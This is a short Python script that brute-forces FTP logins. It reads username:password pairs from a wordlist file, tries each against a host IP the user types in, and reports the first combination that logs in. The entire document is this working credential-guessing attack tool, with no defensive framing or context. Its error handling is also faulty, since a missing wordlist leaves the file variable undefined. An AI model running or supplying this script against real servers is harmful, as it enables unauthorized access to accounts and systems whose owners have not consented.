#!/usr/bin/python3

import ftplib

def bruteLogin(host):
	try:
		filename = open('FTP_password.txt','r')
	except:
		print("File not found")
	for line in filename.readlines():
		username =line.split(":")[0]
		password = line.split(":")[1].strip("\n")
		try:
			ftp = ftplib.FTP(host)
			ftp.login(username,password)
			print("[+] Login successful using " +username +"/" + password)
			return True
		except:
			pass
	print("Username/Password didn't Found :-( ")

host = input("Enter The Host IP address: ")
bruteLogin(host)

